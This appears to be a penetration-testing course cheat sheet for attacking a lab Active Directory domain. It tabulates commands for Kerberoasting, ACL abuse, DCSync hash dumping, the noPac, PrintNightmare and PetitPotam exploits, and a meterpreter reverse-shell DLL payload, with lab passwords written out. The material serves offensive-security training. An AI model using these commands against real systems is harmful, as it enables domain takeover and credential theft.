# Credentialed Enumeration 



| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `xfreerdp /u:forend@inlanefreight.local /p:Klmcargo2 /v:172.16.5.25` | Connects to a Windows target using valid credentials. Performed from a Linux-based host. |
| `sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users` | Authenticates with a Windows target over `smb` using valid credentials and attempts to discover more users (`--users`) in a target Windows domain. Performed from a Linux-based host. |
| `sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups` | Authenticates with a Windows target over `smb` using valid credentials and attempts to discover groups (`--groups`) in a target Windows domain. Performed from a Linux-based host. |
| `sudo crackmapexec smb 172.16.5.125 -u forend -p Klmcargo2 --loggedon-users` | Authenticates with a Windows target over `smb` using valid credentials and attempts to check for a list of logged on users (`--loggedon-users`) on the target Windows host. Performed from a Linux-based host. |
| `sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares` | Authenticates with a Windows target over `smb` using valid credentials and attempts to discover any smb shares (`--shares`). Performed from a Linux-based host. |
| `sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share Dev-share` | Authenticates with a Windows target over `smb` using valid credentials and utilizes the CrackMapExec module (`-M`) `spider_plus` to go through each readable share (`Dev-share`) and list all readable files.  The results are outputted in `JSON`. Performed from a Linux-based host. |
| `smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5` | Enumerates the target Windows domain using valid credentials and lists shares & permissions available on each within the context of the valid credentials used and the target Windows host (`-H`). Performed from a Linux-based host. |
| `smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R SYSVOL --dir-only` | Enumerates the target Windows domain using valid credentials and performs a recursive listing (`-R`) of the specified share (`SYSVOL`) and only outputs a list of directories (`--dir-only`) in the share. Performed from a Linux-based host. |
| ` rpcclient $> queryuser 0x457`                              | Enumerates a target user account in a Windows domain using its relative identifier (`0x457`). Performed from a Linux-based host. |
| `rpcclient $> enumdomusers`                                  | Discovers user accounts in a target Windows domain and their associated relative identifiers (`rid`). Performed from a Linux-based host. |
| `psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125  ` | Impacket tool used to connect to the `CLI`  of a Windows target via the `ADMIN$` administrative share with valid credentials. Performed from a Linux-based host. |
| `wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5  ` | Impacket tool used to connect to the `CLI` of a Windows target via `WMI` with valid credentials. Performed from a Linux-based host. |
| `windapsearch.py -h`                                         | Used to display the options and functionality of windapsearch.py. Performed from a Linux-based host. |
| `python3 windapsearch.py --dc-ip 172.16.5.5 -u inlanefreight\wley -p Klmcargo2 --da` | Used to enumerate the domain admins group (`--da`) using a valid set of credentials on a target Windows domain. Performed from a Linux-based host. |
| `python3 windapsearch.py --dc-ip 172.16.5.5 -u inlanefreight\wley -p Klmcargo2 -PU` | Used to perform a recursive search (`-PU`) for users with nested permissions using valid credentials. Performed from a Linux-based host. |
| `sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all` | Executes the python implementation of BloodHound (`bloodhound.py`) with valid credentials and specifies a name server (`-ns`) and target Windows domain (`inlanefreight.local`)  as well as runs all checks (`-c all`). Runs using valid credentials. Performed from a Linux-based host. |

# Enumeration by Living Off the Land

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `Get-Module`                                                 | PowerShell cmd-let used to list all available modules, their version and command options from a Windows-based host. |
| `Import-Module ActiveDirectory`                              | Loads the `Active Directory` PowerShell module from a Windows-based host. |
| `Get-ADDomain`                                               | PowerShell cmd-let used to gather Windows domain information from a Windows-based host. |
| `Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName` | PowerShell cmd-let used to enumerate user accounts on a target Windows domain and filter by `ServicePrincipalName`. Performed from a Windows-based host. |
| `Get-ADTrust -Filter *`                                      | PowerShell cmd-let used to enumerate any trust relationships in a target Windows domain and filters by any (`-Filter *`). Performed from a Windows-based host. |
| `Get-ADGroup -Filter * \| select name`                        | PowerShell cmd-let used to enumerate groups in a target Windows domain and filters by the name of the group (`select name`). Performed from a Windows-based host. |
| `Get-ADGroup -Identity "Backup Operators"`                   | PowerShell cmd-let used to search for a specifc group (`-Identity "Backup Operators"`). Performed from a Windows-based host. |
| `Get-ADGroupMember -Identity "Backup Operators"`             | PowerShell cmd-let used to discover the members of a specific group (`-Identity "Backup Operators"`). Performed from a Windows-based host. |
| `Export-PowerViewCSV`                                        | PowerView script used to append results to a `CSV` file. Performed from a Windows-based host. |
| `ConvertTo-SID`                                              | PowerView script used to convert a `User` or `Group` name to it's `SID`. Performed from a Windows-based host. |
| `Get-DomainSPNTicket`                                        | PowerView script used to request the kerberos ticket for a specified service principal name (`SPN`). Performed from a Windows-based host. |
| `Get-Domain`                                                 | PowerView script used tol return the AD object for the current (or specified) domain. Performed from a Windows-based host. |
| `Get-DomainController`                                       | PowerView script used to return a list of the target domain controllers for the specified target domain. Performed from a Windows-based host. |
| `Get-DomainUser`                                             | PowerView script used to return all users or specific user objects in AD. Performed from a Windows-based host. |
| `Get-DomainComputer`                                         | PowerView script used to return all computers or specific computer objects in AD. Performed from a Windows-based host. |
| `Get-DomainGroup`                                            | PowerView script used to eturn all groups or specific group objects in AD. Performed from a Windows-based host. |
| `Get-DomainOU`                                               | PowerView script used to search for all or specific OU objects in AD. Performed from a Windows-based host. |
| `Find-InterestingDomainAcl`                                  | PowerView script used to find object `ACLs` in the domain with modification rights set to non-built in objects. Performed from a Windows-based host. |
| `Get-DomainGroupMember`                                      | PowerView script used to return the members of a specific domain group. Performed from a Windows-based host. |
| `Get-DomainFileServer`                                       | PowerView script used to return a list of servers likely functioning as file servers. Performed from a Windows-based host. |
| `Get-DomainDFSShare`                                         | PowerView script used to return a list of all distributed file systems for the current (or specified) domain. Performed from a Windows-based host. |
| `Get-DomainGPO`                                              | PowerView script used to return all GPOs or specific GPO objects in AD. Performed from a Windows-based host. |
| `Get-DomainPolicy`                                           | PowerView script used to return the default domain policy or the domain controller policy for the current domain. Performed from a Windows-based host. |
| `Get-NetLocalGroup`                                          | PowerView script used to  enumerate local groups on a local or remote machine. Performed from a Windows-based host. |
| `Get-NetLocalGroupMember`                                    | PowerView script enumerate members of a specific local group. Performed from a Windows-based host. |
| `Get-NetShare`                                               | PowerView script used to return a list of open shares on a local (or a remote) machine. Performed from a Windows-based host. |
| `Get-NetSession`                                             | PowerView script used to return session information for the local (or a remote) machine. Performed from a Windows-based host. |
| `Test-AdminAccess`                                           | PowerView script used to test if the current user has administrative access to the local (or a remote) machine. Performed from a Windows-based host. |
| `Find-DomainUserLocation`                                    | PowerView script used to find machines where specific users are logged into. Performed from a Windows-based host. |
| `Find-DomainShare`                                           | PowerView script used to find reachable shares on domain machines. Performed from a Windows-based host. |
| `Find-InterestingDomainShareFile`                            | PowerView script that searches for files matching specific criteria on readable shares in the domain. Performed from a Windows-based host. |
| `Find-LocalAdminAccess`                                      | PowerView script used to find machines on the local domain where the current user has local administrator access Performed from a Windows-based host. |
| `Get-DomainTrust`                                            | PowerView script that returns domain trusts for the current domain or a specified domain. Performed from a Windows-based host. |
| `Get-ForestTrust`                                            | PowerView script that returns all forest trusts for the current forest or a specified forest. Performed from a Windows-based host. |
| `Get-DomainForeignUser`                                      | PowerView script that enumerates users who are in groups outside of the user's domain. Performed from a Windows-based host. |
| `Get-DomainForeignGroupMember`                               | PowerView script that enumerates groups with users outside of the group's domain and returns each foreign member. Performed from a Windows-based host. |
| `Get-DomainTrustMapping`                                     | PowerView script that enumerates all trusts for current domain and any others seen. Performed from a Windows-based host. |
| `Get-DomainGroupMember -Identity "Domain Admins" -Recurse`   | PowerView script used to list all the members of a target group (`"Domain Admins"`) through the use of the recurse option (`-Recurse`). Performed from a Windows-based host. |
| `Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName` | PowerView script used to find users on the target Windows domain that have the `Service Principal Name` set. Performed from a Windows-based host. |
| `.\Snaffler.exe  -d INLANEFREIGHT.LOCAL -s -v data`          | Runs a tool called `Snaffler` against a target Windows domain that finds various kinds of data in shares that the compromised account has access to. Performed from a Windows-based host. |

# Transfering Files

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `sudo python3 -m http.server 8001`                           | Starts a python web server for quick hosting of files. Performed from a Linux-basd host. |
| `"IEX(New-Object Net.WebClient).downloadString('http://172.16.5.222/SharpHound.exe')"` | PowerShell one-liner used to download a file from a web server. Performed from a Windows-based host. |
| `impacket-smbserver -ip 172.16.5.x -smb2support -username user -password password shared /home/administrator/Downloads/` | Starts a impacket `SMB` server for quick hosting of a file. Performed from a Windows-based host. |



# Kerberoasting 

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `sudo python3 -m pip install .`                              | Used to install Impacket from inside the directory that gets cloned to the attack host. Performed from a Linux-based host. |
| `GetUserSPNs.py -h`                                          | Impacket tool used to display the options and functionality of `GetUserSPNs.py` from a Linux-based host. |
| `GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday` | Impacket tool used to get a list of `SPNs` on the target Windows domain from  a Linux-based host. |
| `GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request` | Impacket tool used to download/request (`-request`) all TGS tickets for offline processing from a Linux-based host. |
| `GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev` | Impacket tool used to download/request (`-request-user`) a TGS ticket for a specific user account (`sqldev`) from a Linux-based host. |
| `GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev -outputfile sqldev_tgs` | Impacket tool used to download/request a TGS ticket for a specific user account and write the ticket to a file (`-outputfile sqldev_tgs`) linux-based host. |
| `hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt --force` | Attempts to crack the Kerberos (`-m 13100`) ticket hash (`sqldev_tgs`) using `hashcat` and a wordlist (`rockyou.txt`) from a Linux-based host. |
| `setspn.exe -Q */*`                                          | Used to enumerate `SPNs` in a target Windows domain from a Windows-based host. |
| `Add-Type -AssemblyName System.IdentityModel  New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"` | PowerShell script used to download/request the TGS ticket of a specific user from a Windows-based host. |
| `setspn.exe -T INLANEFREIGHT.LOCAL -Q */* \| Select-String '^CN' -Context 0,1 \| % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }` | Used to download/request all TGS tickets from a WIndows-based host. |
| `mimikatz # base64 /out:true`                                | `Mimikatz` command that ensures TGS tickets are extracted in `base64` format from a Windows-based host. |
| `kerberos::list /export `                                    | `Mimikatz` command used to extract the TGS tickets from a Windows-based host. |
| `echo "<base64 blob>" \|  tr -d \\n `                         | Used to prepare the base64 formatted TGS ticket for cracking from Linux-based host. |
| `cat encoded_file \| base64 -d > sqldev.kirbi`                 | Used to output a file (`encoded_file`) into a .kirbi file in base64 (`base64 -d > sqldev.kirbi`) format from a Linux-based host. |
| `python2.7 kirbi2john.py sqldev.kirbi`                       | Used to extract the `Kerberos ticket`. This also creates a file called `crack_file` from a Linux-based host. |
| `sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat` | Used to modify the `crack_file` for `Hashcat` from a Linux-based host. |
| `cat sqldev_tgs_hashcat `                                    | Used to view the prepared hash from a Linux-based host.      |
| `hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt ` | Used to crack the prepared Kerberos ticket hash (`sqldev_tgs_hashcat`) using a wordlist (`rockyou.txt`) from a Linux-based host. |
| `Import-Module .\PowerView.ps1  Get-DomainUser * -spn \| select samaccountname` | Uses PowerView tool to extract `TGS Tickets` . Performed from a Windows-based host. |
| `Get-DomainUser -Identity sqldev \| Get-DomainSPNTicket -Format Hashcat` | PowerView tool used to download/request the TGS ticket of a specific ticket and automatically format it for `Hashcat` from a Windows-based host. |
| `Get-DomainUser * -SPN \| Get-DomainSPNTicket -Format Hashcat \| Export-Csv .\ilfreight_tgs.csv -NoTypeInformation` | Exports all TGS tickets to a `.CSV` file (`ilfreight_tgs.csv`) from a Windows-based host. |
| `cat .\ilfreight_tgs.csv`                                    | Used to view the contents of the .csv file from a Windows-based host. |
| `.\Rubeus.exe`                                               | Used to view the options and functionality possible with the tool `Rubeus`. Performed from a Windows-based host. |
| `.\Rubeus.exe kerberoast /stats`                             | Used to check the kerberoast stats (`/stats`) within the target Windows domain from a Windows-based host. |
| `.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap` | Used to request/download TGS tickets for accounts with the `admin` count set to `1` then formats the output in an easy to view & crack manner (`/nowrap`) . Performed from a Windows-based host. |
| `.\Rubeus.exe kerberoast /user:testspn /nowrap`              | Used to request/download a TGS ticket for a specific user (`/user:testspn`) the formats the output in an easy to view & crack manner (`/nowrap`). Performed from a Windows-based host. |
| `Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes` | PowerView tool used to check the `msDS-SupportedEncryptionType` attribute associated with a specific user account (`testspn`). Performed from a Windows-based host. |
| `hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt` | Used to attempt to crack the ticket hash using a wordlist (`rockyou.txt`) from a Linux-based host . |



# ACL Enumeration & Tactics 

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `Find-InterestingDomainAcl`                                  | PowerView tool used to find object ACLs in the target Windows domain with modification rights set to non-built in objects from a Windows-based host. |
| `Import-Module .\PowerView.ps1  $sid = Convert-NameToSid wley` | Used to import PowerView and retrieve the `SID` of a specific user account (`wley`) from a Windows-based host. |
| `Get-DomainObjectACL -Identity * \| ? {$_.SecurityIdentifier -eq $sid}` | Used to find all Windows domain objects that the user has rights over by mapping the user's `SID` to the `SecurityIdentifier` property from a Windows-based host. |
| `$guid= "00299570-246d-11d0-a768-00aa006e0529"   Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * \| Select Name,DisplayName,DistinguishedName,rightsGuid \| ?{$_.rightsGuid -eq $guid} \| fl` | Used to perform a reverse search & map to a `GUID` value from a Windows-based host. |
| `Get-DomainObjectACL -ResolveGUIDs -Identity * \| ? {$_.SecurityIdentifier -eq $sid} ` | Used to discover a domain object's ACL by performing a search based on GUID's (`-ResolveGUIDs`) from a Windows-based host. |
| `Get-ADUser -Filter * \| Select-Object -ExpandProperty SamAccountName > ad_users.txt` | Used to discover a group of user accounts in a target Windows domain and add the output to a text file (`ad_users.txt`) from a Windows-based host. |
| `foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" \| Select-Object Path -ExpandProperty Access \| Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}` | A `foreach loop` used to retrieve ACL information for each domain user in a target Windows domain by feeding each list of a text file(`ad_users.txt`) to the `Get-ADUser` cmdlet, then enumerates access rights of those users. Performed from a Windows-based host. |
| `$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword) ` | Used to create a `PSCredential Object` from a Windows-based host. |
| `$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force` | Used to create a `SecureString Object` from a Windows-based host. |
| `Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose` | PowerView tool used to change the password of a specifc user (`damundsen`) on a target Windows domain from a Windows-based host. |
| `Get-ADGroup -Identity "Help Desk Level 1" -Properties * \| Select -ExpandProperty Members` | PowerView tool used view the members of a target security group (`Help Desk Level 1`) from a Windows-based host. |
| `Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose` | PowerView tool used to add a specifc user (`damundsen`) to a specific security group (`Help Desk Level 1`) in a target Windows domain from a Windows-based host. |
| `Get-DomainGroupMember -Identity "Help Desk Level 1" \| Select MemberName` | PowerView tool used to view the members of a specific security group (`Help Desk Level 1`) and output only the username of each member (`Select MemberName`) of the group from a Windows-based host. |
| `Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose` | PowerView tool used create a fake `Service Principal Name` given a sepecift user (`adunn`) from a Windows-based host. |
| `Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose` | PowerView tool used to remove the fake `Service Principal Name` created during the attack from a Windows-based host. |
| `Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose` | PowerView tool used to remove a specific user (`damundsent`) from a specific security group (`Help Desk Level 1`) from a Windows-based host. |
| `ConvertFrom-SddlString`                                     | PowerShell cmd-let used to covert an `SDDL string` into a readable format. Performed from a Windows-based host. |



# DCSync 

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `Get-DomainUser -Identity adunn  \| select samaccountname,objectsid,memberof,useraccountcontrol \|fl` | PowerView tool used to view the group membership of a specific user (`adunn`) in a target Windows domain. Performed from a Windows-based host. |
| `$sid= "S-1-5-21-3842939050-3880317879-2865463114-1164" Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs \| ? { ($_.ObjectAceType -match 'Replication-Get')} \| ?{$_.SecurityIdentifier -match $sid} \| select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType \| fl` | Used to create a variable called SID that is set equal to the SID of a user account. Then uses PowerView tool `Get-ObjectAcl` to check a specific user's replication rights. Performed from a Windows-based host. |
| `secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 -use-vss` | Impacket tool sed to extract NTLM hashes from the NTDS.dit file hosted on a target Domain Controller (`172.16.5.5`) and save the extracted hashes to an file (`inlanefreight_hashes`). Performed from a Linux-based host. |
| `mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator` | Uses `Mimikatz` to perform a `dcsync` attack from a Windows-based host. |



# Privileged Access 

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"` | PowerView based tool to used to enumerate the `Remote Desktop Users` group on a Windows target (`-ComputerName ACADEMY-EA-MS01`) from a Windows-based host. |
| `Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"` | PowerView based tool to used to enumerate the `Remote Management Users` group on a Windows target (`-ComputerName ACADEMY-EA-MS01`) from a Windows-based host. |
| `$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force` | Creates a variable (`$password`) set equal to the password (`Klmcargo2`) of a user from a Windows-based host. |
| `$cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)` | Creates a variable (`$cred`) set equal to the username (`forend`) and password (`$password`) of a target domain account from a Windows-based host. |
| `Enter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred` | Uses the PowerShell cmd-let `Enter-PSSession` to establish a PowerShell session with a target over the network (`-ComputerName ACADEMY-EA-DB01`) from a Windows-based host. Authenticates using credentials made in the 2 commands shown prior (`$cred` & `$password`). |
| `evil-winrm -i 10.129.201.234 -u forend`                     | Used to establish a PowerShell session with a Windows target from a Linux-based host using `WinRM`. |
| `Import-Module .\PowerUpSQL.ps1`                             | Used to import the `PowerUpSQL` tool.                        |
| `Get-SQLInstanceDomain`                                      | PowerUpSQL tool used to enumerate SQL server instances from a Windows-based host. |
| `Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'` | PowerUpSQL tool used to connect to connect to a SQL server and query the version (`-query 'Select @@version'`) from a Windows-based host. |
| `mssqlclient.py`                                             | Impacket tool used to display the functionality and options provided with `mssqlclient.py` from a Linux-based host. |
| `mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth` | Impacket tool used to connect to a MSSQL server from a Linux-based host. |
| `SQL> help`                                                  | Used to display mssqlclient.py options once connected to a MSSQL server. |
| `SQL> enable_xp_cmdshell`                                   | Used to enable `xp_cmdshell stored procedure` that allows for executing OS commands via the database from a Linux-based host. |
| `xp_cmdshell whoami /priv`                                   | Used to enumerate rights on a system using `xp_cmdshell`.    |



# NoPac

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `sudo git clone https://github.com/Ridter/noPac.git`         | Used to clone a `noPac` exploit using git. Performed from a Linux-based host. |
| `sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap` | Runs `scanner.py` to check if a target system is vulnerable to `noPac`/`Sam_The_Admin` from a Linux-based host. |
| `sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap` | Used to exploit the `noPac`/`Sam_The_Admin`  vulnerability and gain a SYSTEM shell (`-shell`). Performed from a Linux-based host. |
| `sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator` | Used to exploit the `noPac`/`Sam_The_Admin`  vulnerability and perform a `DCSync` attack against the built-in Administrator account on a Domain Controller from a Linux-based host. |



# PrintNightmare

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `git clone https://github.com/cube0x0/CVE-2021-1675.git`     | Used to clone a PrintNightmare exploit  using git from a Linux-based host. |
| `pip3 uninstall impacket git clone https://github.com/cube0x0/impacket cd impacket python3 ./setup.py install` | Used to ensure the exploit author's (`cube0x0`) version of Impacket is installed. This also uninstalls any previous Impacket version on a Linux-based host. |
| `rpcdump.py @172.16.5.5 \| egrep 'MS-RPRN\|MS-PAR'`            | Used to check if a Windows target has `MS-PAR` & `MSRPRN` exposed from a Linux-based host. |
| `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.129.202.111 LPORT=8080 -f dll > backupscript.dll` | Used to generate a DLL payload to be used by the exploit to gain a shell session. Performed from a Windows-based host. |
| `sudo smbserver.py -smb2support CompData /path/to/backupscript.dll` | Used to create an SMB server and host a shared folder (`CompData`) at the specified location on the local linux host. This can be used to host the DLL payload that the exploit will attempt to download to the host. Performed from a Linux-based host. |
| `sudo python3 CVE-2021-1675.py inlanefreight.local/<username>:<password>@172.16.5.5 '\\10.129.202.111\CompData\backupscript.dll'` | Executes the exploit and specifies the location of the DLL payload. Performed from a Linux-based host. |



# PetitPotam

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController` | Impacket tool used to create an `NTLM relay` by specifiying the web enrollment URL for the `Certificate Authority` host. Perfomred from a Linux-based host. |
| `git clone https://github.com/topotam/PetitPotam.git`        | Used to clone the `PetitPotam` exploit using git. Performed from a Linux-based host. |
| `python3 PetitPotam.py 172.16.5.225 172.16.5.5`              | Used to execute the PetitPotam exploit by  specifying the IP address of the attack host (`172.16.5.255`) and the target Domain Controller (`172.16.5.5`). Performed from a Linux-based host. |
| `python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 <base64 certificate> = dc01.ccache` | Uses `gettgtpkinit`.py to request a TGT ticket for the Domain Controller (`dc01.ccache`) from a Linux-based host. |
| `secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL` | Impacket tool used to perform a DCSync attack and retrieve one or all of the `NTLM password hashes` from the target Windows domain. Performed from a Linux-based host. |
| `klist`                                                      | `krb5-user` command used to view the contents of the `ccache` file. Performed from a Linux-based host. |
| `python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$` | Used to submit TGS requests using `getnthash.py` from a Linux-based host. |
| `secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba` | Impacket tool used to extract hashes from `NTDS.dit` using a `DCSync attack` and a captured hash (`-hashes`). Performed from a Linux-based host. |
| `.\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /<base64 certificate>=/ptt` | Uses Rubeus to request a TGT and perform a `pass-the-ticket attack` using the machine account (`/user:ACADEMY-EA-DC01$`) of a Windows target. Performed from a Windows-based host. |
| `mimikatz # lsadump::dcsync /user:inlanefreight\krbtgt`      | Performs a DCSync attack using `Mimikatz`. Performed from a Windows-based host. |



# Miscellaneous Misconfigurations

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `Import-Module .\SecurityAssessment.ps1`                     | Used to import the module `Security Assessment.ps1`. Performed from a Windows-based host. |
| `Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL` | SecurityAssessment.ps1 based tool used to enumerate a Windows target for `MS-PRN Printer bug`. Performed from a Windows-based host. |
| `adidnsdump -u inlanefreight\\forend ldap://172.16.5.5`      | Used to resolve all records in a DNS zone over `LDAP` from a Linux-based host. |
| `adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r`   | Used to resolve unknown records in a DNS zone by performing an `A query` (`-r`) from a Linux-based host. |
| `Get-DomainUser * \| Select-Object samaccountname,description ` | PowerView tool used to display the description field of select objects (`Select-Object`) on a target Windows domain from a Windows-based host. |
| `Get-DomainUser -UACFilter PASSWD_NOTREQD \| Select-Object samaccountname,useraccountcontrol` | PowerView tool used to check for the `PASSWD_NOTREQD` setting of select objects (`Select-Object`) on a target Windows domain from a Windows-based host. |
| `ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts`    | Used to list the contents of a share hosted on a Windows target from the context of a currently logged on user. Performed from a Windows-based host. |

# Group Policy Enumeration & Attacks

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE`    | Tool used to decrypt a captured `group policy preference password` from a Linux-based host. |
| `crackmapexec smb -L \| grep gpp`                              | Locates and retrieves a `group policy preference password` using `CrackMapExec`, the filters the output using `grep`. Peformed from a Linux-based host. |
| `crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin` | Locates and retrieves any credentials stored in the `SYSVOL` share of a Windows target using `CrackMapExec` from a Linux-based host. |
| `Get-DomainGPO \| select displayname`                          | PowerView tool used to enumerate GPO names in a target Windows domain from a Windows-based host. |
| `Get-GPO -All \| Select DisplayName`                          | PowerShell cmd-let used to enumerate GPO names. Performed from a Windows-based host. |
| `$sid=Convert-NameToSid "Domain Users" `                     | Creates a variable called `$sid` that is set equal to the `Convert-NameToSid` tool and specifies the group account `Domain Users`. Performed from a Windows-based host. |
| `Get-DomainGPO \| Get-ObjectAcl \| ?{$_.SecurityIdentifier -eq $sid` | PowerView tool that is used to check if the `Domain Users`  (`eq $sid`) group has any rights over one or more GPOs. Performed from a Windows-based host. |
| `Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532`         | PowerShell cmd-let used to display the name of a GPO given a `GUID`. Performed from a Windows-based host. |



# ASREPRoasting

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `Get-DomainUser -PreauthNotRequired \| select samaccountname,userprincipalname,useraccountcontrol \| fl` | PowerView based tool used to search for the `DONT_REQ_PREAUTH` value across in user accounts in a target Windows domain. Performed from a Windows-based host. |
| `.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat` | Uses `Rubeus` to perform an `ASEP Roasting attack` and formats the output for `Hashcat`. Performed from a Windows-based host. |
| `hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt ` | Uses `Hashcat` to attempt to crack the captured hash using a wordlist (`rockyou.txt`). Performed from a Linux-based host. |
| `kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt ` | Enumerates users in a target Windows domain and automatically retrieves the `AS` for any users found that don't require Kerberos pre-authentication. Performed from a Linux-based host. |



# Trust Relationships - Child > Parent Trusts 

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `Import-Module activedirectory`                              | Used to import the `Active Directory` module. Performed from a Windows-based host. |
| `Get-ADTrust -Filter *`                                      | PowerShell cmd-let used to enumerate a target Windows domain's trust relationships. Performed from a Windows-based host. |
| `Get-DomainTrust `                                           | PowerView tool used to enumerate a target Windows domain's trust relationships. Performed from a Windows-based host. |
